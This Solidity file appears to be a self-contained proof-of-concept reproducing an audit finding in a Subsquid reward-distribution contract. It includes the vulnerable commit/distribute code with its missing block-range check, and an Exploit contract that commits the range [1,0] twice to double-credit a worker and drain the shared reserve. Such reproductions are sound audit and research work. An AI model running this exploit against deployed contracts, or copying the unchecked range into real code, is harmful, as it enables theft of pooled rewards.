// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Subsquid finding 58245 (H-01):
// "Missing check on `toBlock` allows distributors to change past rewards".
//
// Real audited source (the vulnerable `commit` + `distribute` are reproduced
// VERBATIM, the vulnerable line is marked @>):
//   repo   github.com/subsquid/subsquid-network-contracts  (audit-era commit 0ec86703cee2)
//   file   packages/contracts/src/DistributedRewardDistribution.sol
//   fns    commit (L111-135) and distribute (L190-205)
//   report github.com/pashov/audits Subsquid-security-review.md  (H-01)
//
// Root cause: `commit` validates `toBlock < block.number` ("Future block") but
// NEVER checks `toBlock >= fromBlock`. A malicious distributor can therefore
// commit a degenerate range with `toBlock = 0`. When the commitment is
// distributed, `distribute` runs `lastBlockRewarded = toBlock` — so
// `lastBlockRewarded` is driven to 0. The sequential guard
// `require(lastBlockRewarded == 0 || fromBlock == lastBlockRewarded + 1, ...)`
// then passes for ANY subsequent `fromBlock`, so the SAME block range can be
// distributed again and again. Each re-distribution re-credits `_claimable`,
// letting the distributor mint reward entitlement for their own worker without
// bound and drain the shared reward reserve.
//
// The vulnerable `commit`/`distribute` bodies are byte-for-byte the audited
// source. Non-vulnerable dependencies (AccessControlledPausable pause/roles,
// the round-robin `currentDistributor()` selector, the `IRouter`/`IStaking`
// wiring, and the RewardTreasury claim path) are faithful minimal doubles:
// real ERC20 transfers and real `_claimable` accounting — nothing is faked.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the SQD reward token (the reward reserve).
contract RewardToken {
    string public name = "Subsquid";
    string public symbol = "SQD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IStaking {
    function distribute(uint256[] calldata recipients, uint256[] calldata stakerRewards) external;
}

interface IRouter {
    function staking() external view returns (IStaking);
}

/// @dev Faithful minimal double of the Staking contract. `distribute` credits
///      per-recipient staker rewards to a ledger (mirrors the real accrual);
///      staker rewards are not the exploited leg here (worker rewards are), so
///      the ledger is kept read-only for assertions.
contract Staking is IStaking {
    mapping(uint256 => uint256) public stakerClaimable;

    function distribute(uint256[] calldata recipients, uint256[] calldata stakerRewards) external {
        for (uint256 i = 0; i < recipients.length; i++) {
            stakerClaimable[recipients[i]] += stakerRewards[i];
        }
    }
}

/// @dev Faithful minimal double of the Router: just exposes the staking address.
contract Router is IRouter {
    IStaking internal _staking;

    constructor(IStaking s) {
        _staking = s;
    }

    function staking() external view returns (IStaking) {
        return _staking;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `commit` and `distribute` are reproduced VERBATIM from
// the audited DistributedRewardDistribution.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract DistributedRewardsDistribution {
    // ── audited state (verbatim names/types for the fields the bug touches) ──
    mapping(uint256 => uint256) internal _claimable; // workerId => claimable worker reward
    mapping(uint256 => mapping(uint256 => bytes32)) public commitments; // fromBlock => toBlock => commitment
    mapping(uint256 => mapping(uint256 => uint8)) public approves; // fromBlock => toBlock => approves
    mapping(bytes32 => mapping(address => bool)) public alreadyApproved;
    uint8 internal requiredApproves;
    uint256 public lastBlockRewarded;
    IRouter public immutable router;

    // ── faithful doubles for AccessControlledPausable + round-robin selection ──
    RewardToken internal rewardToken; // the shared reward reserve (SQD held here)
    address internal _currentDistributor; // faithful double: the real impl returns distributors.at(distributorIndex())

    event NewCommitment(
        address indexed who,
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] recipients,
        uint256[] workerRewards,
        uint256[] stakerRewards
    );
    event Approved(
        address indexed who,
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] recipients,
        uint256[] workerRewards,
        uint256[] stakerRewards
    );
    event Distributed(uint256 fromBlock, uint256 toBlock);

    /// @dev Faithful double of AccessControlledPausable's unpaused state.
    modifier whenNotPaused() {
        _;
    }

    constructor(IRouter _router, RewardToken _rewardToken) {
        requiredApproves = 1; // audited constructor sets requiredApproves = 1
        router = _router;
        rewardToken = _rewardToken;
    }

    /// @dev Faithful double: registers the sole distributor allowed to commit.
    ///      Real impl selects a committer via round-robin over an EnumerableSet.
    function addDistributor(address distributor) external {
        _currentDistributor = distributor;
    }

    /// @return the distributor which can currently commit rewards
    /// @dev Faithful double of `distributors.at(distributorIndex())`.
    function currentDistributor() public view returns (address) {
        return _currentDistributor;
    }

    /**
     * @dev Commit rewards for a worker  — VERBATIM from the audited source.
     */
    function commit(
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] calldata recipients,
        uint256[] calldata workerRewards,
        uint256[] calldata _stakerRewards
    ) external whenNotPaused {
        require(recipients.length == workerRewards.length, "Recipients and worker amounts length mismatch");
        require(recipients.length == _stakerRewards.length, "Recipients and staker amounts length mismatch");

        require(currentDistributor() == msg.sender, "Not a distributor");
        require(toBlock < block.number, "Future block"); // @> VULN: missing `require(toBlock >= fromBlock)` — toBlock may be < fromBlock (even 0), so distribute() sets lastBlockRewarded = toBlock = 0 and re-opens the sequential guard, letting the same range be rewarded repeatedly
        bytes32 commitment = keccak256(msg.data[4:]);
        require(!alreadyApproved[commitment][msg.sender], "Already approved");
        commitments[fromBlock][toBlock] = commitment;
        approves[fromBlock][toBlock] = 1;
        alreadyApproved[commitment][msg.sender] = true;

        if (requiredApproves == 1) {
            distribute(fromBlock, toBlock, recipients, workerRewards, _stakerRewards);
        }

        emit NewCommitment(msg.sender, fromBlock, toBlock, recipients, workerRewards, _stakerRewards);
        emit Approved(msg.sender, fromBlock, toBlock, recipients, workerRewards, _stakerRewards);
    }

    /// @dev All distributions must be sequential and not blocks can be missed
    /// E.g, after distribution for blocks [A, B], next one bust be for [B + 1, C]
    /// VERBATIM from the audited source.
    function distribute(
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] calldata recipients,
        uint256[] calldata workerRewards,
        uint256[] calldata _stakerRewards
    ) internal {
        require(lastBlockRewarded == 0 || fromBlock == lastBlockRewarded + 1, "Not all blocks covered");
        for (uint256 i = 0; i < recipients.length; i++) {
            _claimable[recipients[i]] += workerRewards[i];
        }
        router.staking().distribute(recipients, _stakerRewards);
        lastBlockRewarded = toBlock;

        emit Distributed(fromBlock, toBlock);
    }

    // ── faithful minimal double of the RewardTreasury claim path ──
    // Real system: RewardTreasury.claim(who) -> distribution.claim(who) returns the
    // accumulated `_claimable` (and zeroes it), then transfers that many SQD to
    // `who`. Reproduced here as a single call that pays from the reserve held by
    // this contract. The accounting (pay exactly `_claimable`, then zero) is faithful.
    function claimable(uint256 workerId) external view returns (uint256) {
        return _claimable[workerId];
    }

    function claim(uint256 workerId, address to) external returns (uint256 amount) {
        amount = _claimable[workerId];
        _claimable[workerId] = 0;
        rewardToken.transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a malicious distributor commits the SAME degenerate range
// [fromBlock=1, toBlock=0] twice. Because `toBlock = 0` keeps `lastBlockRewarded`
// pinned at 0, the sequential guard never blocks the re-distribution, so the
// distributor's own worker is credited the reward TWICE for one epoch. It then
// claims the doubled entitlement out of the shared reward reserve.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    RewardToken public rewardToken;
    Staking public staking;
    Router public router;
    DistributedRewardsDistribution public vuln;

    uint256 internal constant WORKER_ID = 42; // attacker-owned worker
    uint256 internal constant R = 1000e18; // reward credited per (bogus) distribution
    uint256 internal constant RESERVE = 5000e18; // shared reward reserve (other participants' SQD)

    uint256 public claimedByAttacker; // tokens the attacker walked away with
    uint256 public reserveDrained; // tokens removed from the shared reserve
    uint256 public claimableAfterDouble; // _claimable[WORKER_ID] after two distributions
    uint256 public profit;

    constructor() {
        rewardToken = new RewardToken(); // child nonce 1  (profit token)
        staking = new Staking(); // child nonce 2
        router = new Router(staking); // child nonce 3
        vuln = new DistributedRewardsDistribution(router, rewardToken); // child nonce 4 (VULN)

        // fund the distributor with the shared reward reserve (SQD staked/allocated by the protocol)
        rewardToken.mint(address(vuln), RESERVE);

        // attacker is the (only) registered distributor / current committer
        vuln.addDistributor(address(this));
    }

    function run() external {
        uint256[] memory recipients = new uint256[](1);
        recipients[0] = WORKER_ID;
        uint256[] memory workerRewards = new uint256[](1);
        workerRewards[0] = R;

        // ── Distribution #1: degenerate range [fromBlock=1, toBlock=0] ──
        // Missing `toBlock >= fromBlock` check lets this through. First distribution:
        // lastBlockRewarded == 0 passes; worker credited R; lastBlockRewarded := toBlock == 0.
        uint256[] memory stakerA = new uint256[](1);
        stakerA[0] = 0;
        vuln.commit(1, 0, recipients, workerRewards, stakerA);
        require(vuln.lastBlockRewarded() == 0, "guard should be pinned at 0");

        // ── Distribution #2: the SAME range [1, 0] again ──
        // Only the staker-rewards leg differs so the commitment hash is fresh
        // (dodging `Already approved`); the worker leg re-credits the SAME range.
        // Sequential guard passes purely because lastBlockRewarded is still 0.
        uint256[] memory stakerB = new uint256[](1);
        stakerB[0] = 1;
        vuln.commit(1, 0, recipients, workerRewards, stakerB);

        // Same epoch rewarded twice: worker entitlement is now 2 * R.
        claimableAfterDouble = vuln.claimable(WORKER_ID);
        require(claimableAfterDouble == 2 * R, "same epoch not double-rewarded");

        // Cash out the doubled entitlement from the shared reserve.
        uint256 reserveBefore = rewardToken.balanceOf(address(vuln));
        claimedByAttacker = vuln.claim(WORKER_ID, address(this));
        reserveDrained = reserveBefore - rewardToken.balanceOf(address(vuln));
        profit = rewardToken.balanceOf(address(this));

        // HARM: the attacker extracted 2*R for a single epoch (R stolen from the
        // shared reserve on top of the one legitimate payout), draining the reserve
        // by 2*R. This is unbounded — the range can be re-rewarded any number of times.
        require(claimedByAttacker == 2 * R, "did not claim double reward");
        require(profit == 2 * R, "attacker did not receive doubled reward");
        require(reserveDrained == 2 * R, "shared reserve not drained by doubled amount");
    }
}
